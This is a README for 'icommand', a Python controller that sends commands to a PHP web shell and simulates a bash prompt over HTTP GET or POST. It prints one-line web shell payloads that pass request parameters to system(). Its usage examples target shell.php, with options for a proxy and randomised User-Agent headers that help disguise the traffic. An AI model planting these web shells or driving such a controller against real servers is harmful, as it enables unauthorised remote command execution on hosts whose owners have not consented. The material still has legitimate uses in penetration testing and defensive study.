icommand - command controller for PHP system function
---
![My image](http://s9.postimage.org/6u4546aov/icommand.png)  

### Info: ###
---
icommand is a command controller for PHP _program execution functions_ like system, passthru, exec and etc ...  
The script tries to simulate Linux bash as it works from CLI.  
As of optional settings it supports HTTP proxy together with HTTP header values "User-Agent".  
It sends requests to the server through urllib/urllib2 [Python][] modules.   

* icommand works for **POST** and **GET** requests:
	- `<?php system($_GET['cmd']); ?>`  
	- `<?php system($_POST['cmd']); ?>`

### Usage: ###
---
* --url is a positional argument withing GET and POST requests:
    - python icommand.py --url http://testserver.com/shell.php?cmd=  
    - python icommand.py --url http://testserver.com/shell.php --method POST --parameter cmd
    - python icommand.py -u http://testserver.com -p id --proxy http://127.0.0.1:8080  
    - python icommand.py -u http://testserver.com/shell.php?cmd= --random-agent

[Python]: http://www.python.org/download/
__p.s.__
---
[argparse]: http://docs.python.org/library/argparse.html
If your [Python][]'s version < 7.X  
Then [argparse][] is required.  
To install it run:  
`easy_install argparse` **OR** `pip install argparse`

